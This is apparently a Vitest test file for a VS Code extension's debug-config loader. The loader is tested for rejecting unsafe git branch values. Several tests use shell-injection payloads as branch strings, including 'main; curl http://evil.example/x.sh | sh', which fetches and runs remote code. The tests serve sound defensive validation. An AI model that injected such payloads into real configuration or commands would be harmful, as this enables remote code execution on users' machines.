import { beforeEach, describe, expect, it, vi } from 'vitest';
import * as fs from 'node:fs/promises';

vi.mock('node:fs/promises');

interface MockInspectResult {
  key: string;
  defaultValue?: unknown;
  globalValue?: unknown;
  workspaceValue?: unknown;
  workspaceFolderValue?: unknown;
  defaultLanguageValue?: unknown;
  globalLanguageValue?: unknown;
  workspaceLanguageValue?: unknown;
  workspaceFolderLanguageValue?: unknown;
  languageIds?: string[];
}

const { outputAppendLineMock, showWarningMessageMock, vscodeConfigState } = vi.hoisted(() => ({
  outputAppendLineMock: vi.fn<(message: string) => void>(),
  showWarningMessageMock: vi.fn<(message: string) => Thenable<string | undefined>>(),
  vscodeConfigState: {
    inspectResult: undefined as MockInspectResult | undefined,
  },
}));

vi.mock('vscode', () => ({
  workspace: {
    getConfiguration: () => ({
      inspect: () => vscodeConfigState.inspectResult,
    }),
  },
  window: {
    createOutputChannel: () => ({
      appendLine: outputAppendLineMock,
      dispose: vi.fn(),
      show: vi.fn(),
    }),
    showWarningMessage: showWarningMessageMock,
  },
}));

import {
  getUserCapDebugConfig,
  normalizeCapDebugConfig,
  readCapDebugConfig,
  resolveSharedCapDebugConfig,
} from '../../src/core/capDebugConfig';

function expectSecurityWarningWithoutPayload(payload: string): void {
  const notification = showWarningMessageMock.mock.calls[0]?.[0] ?? '';
  const output = outputAppendLineMock.mock.calls.map((call) => call[0]).join('\n');

  expect(notification).toContain('Rejected unsafe git branch');
  expect(notification).not.toContain(payload);
  expect(output).toContain('Rejected unsafe git branch');
  expect(output).not.toContain(payload);
}

describe('normalizeCapDebugConfig', () => {
  it('returns null when the value is not an object', () => {
    expect(normalizeCapDebugConfig(null)).toBeNull();
    expect(normalizeCapDebugConfig('invalid')).toBeNull();
  });

  it('keeps only supported string fields and string map entries', () => {
    const result = normalizeCapDebugConfig({
      remoteRoot: '/sample/global-root',
      branch: 'sample-branch',
      orgBranchMap: {
        'sample-org': 'sample-branch',
        ignored: 123,
      },
      ignoredField: true,
    });

    expect(result).toEqual({
      remoteRoot: '/sample/global-root',
      branch: 'sample-branch',
      orgBranchMap: {
        'sample-org': 'sample-branch',
      },
    });
  });
});

describe('getUserCapDebugConfig', () => {
  beforeEach(() => {
    vi.resetAllMocks();
    vscodeConfigState.inspectResult = undefined;
  });

  it('returns null when the user setting is not configured', () => {
    expect(getUserCapDebugConfig()).toBeNull();
  });

  it('returns the normalized user setting from globalValue', () => {
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {
        remoteRoot: '/sample/global-root',
        orgBranchMap: {
          'sample-org': 'sample-branch',
        },
      },
    };

    expect(getUserCapDebugConfig()).toEqual({
      remoteRoot: '/sample/global-root',
      orgBranchMap: {
        'sample-org': 'sample-branch',
      },
    });
  });

  it('ignores workspaceValue and returns null when no globalValue exists', () => {
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      workspaceValue: {
        remoteRoot: '/sample/workspace-root',
      },
    };

    expect(getUserCapDebugConfig()).toBeNull();
  });

  it('returns null when the user setting object has no valid supported fields', () => {
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {
        remoteRoot: 123,
        orgBranchMap: {
          'sample-org': 456,
        },
      },
    };

    expect(getUserCapDebugConfig()).toBeNull();
  });

  it('rejects unsafe user setting branch values with a security warning', () => {
    const payload = 'main; touch /tmp/sentinel';
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {
        remoteRoot: '/sample/global-root',
        branch: payload,
      },
    };

    expect(getUserCapDebugConfig()).toBeNull();
    expectSecurityWarningWithoutPayload(payload);
  });

  it('rejects unsafe user setting orgBranchMap values with a security warning', () => {
    const payload = 'main && touch /tmp/sentinel';
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {
        orgBranchMap: {
          'sample-org': payload,
        },
      },
    };

    expect(getUserCapDebugConfig()).toBeNull();
    expectSecurityWarningWithoutPayload(payload);
  });
});

describe('resolveSharedCapDebugConfig', () => {
  beforeEach(() => {
    vi.resetAllMocks();
    vscodeConfigState.inspectResult = undefined;
  });

  it('prefers the user setting over the workspace fallback file', async () => {
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {
        remoteRoot: '/sample/global-root',
      },
    };
    vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({ remoteRoot: '/sample/workspace-root' }));

    const result = await resolveSharedCapDebugConfig('/sample-workspace');

    expect(result).toEqual({ remoteRoot: '/sample/global-root' });
  });

  it('falls back to the workspace file when the user setting is absent', async () => {
    vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({ remoteRoot: '/sample/workspace-root' }));

    const result = await resolveSharedCapDebugConfig('/sample-workspace');

    expect(result).toEqual({ remoteRoot: '/sample/workspace-root' });
  });

  it('falls back to the workspace file when the user setting is malformed', async () => {
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {
        remoteRoot: 123,
      },
    };
    vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({ remoteRoot: '/sample/workspace-root' }));

    const result = await resolveSharedCapDebugConfig('/sample-workspace');

    expect(result).toEqual({ remoteRoot: '/sample/workspace-root' });
  });

  it('returns null when neither the user setting nor workspace file has valid config values', async () => {
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {},
    };
    vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({ remoteRoot: 123 }));

    const result = await resolveSharedCapDebugConfig('/sample-workspace');

    expect(result).toBeNull();
  });

  it('falls back to the workspace file when the user setting contains an unsafe branch', async () => {
    vscodeConfigState.inspectResult = {
      key: 'sharedCapDebugConfig',
      globalValue: {
        branch: 'main|sh',
      },
    };
    vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({ remoteRoot: '/sample/workspace-root' }));

    const result = await resolveSharedCapDebugConfig('/sample-workspace');

    expect(result).toEqual({ remoteRoot: '/sample/workspace-root' });
  });
});

describe('readCapDebugConfig', () => {
  beforeEach(() => {
    vi.resetAllMocks();
    vscodeConfigState.inspectResult = undefined;
  });

  it('rejects unsafe branch values from cap-debug-config.json with a security warning', async () => {
    const payload = 'main; curl http://evil.example/x.sh | sh';
    vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({
      remoteRoot: '/sample/service-root',
      branch: payload,
    }));

    const result = await readCapDebugConfig('/sample-service');

    expect(result).toBeNull();
    expectSecurityWarningWithoutPayload(payload);
  });

  it('rejects unsafe orgBranchMap values from cap-debug-config.json with a security warning', async () => {
    const payload = 'main$(touch /tmp/sentinel)';
    vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({
      orgBranchMap: {
        'sample-org': payload,
      },
    }));

    const result = await readCapDebugConfig('/sample-service');

    expect(result).toBeNull();
    expectSecurityWarningWithoutPayload(payload);
  });
});
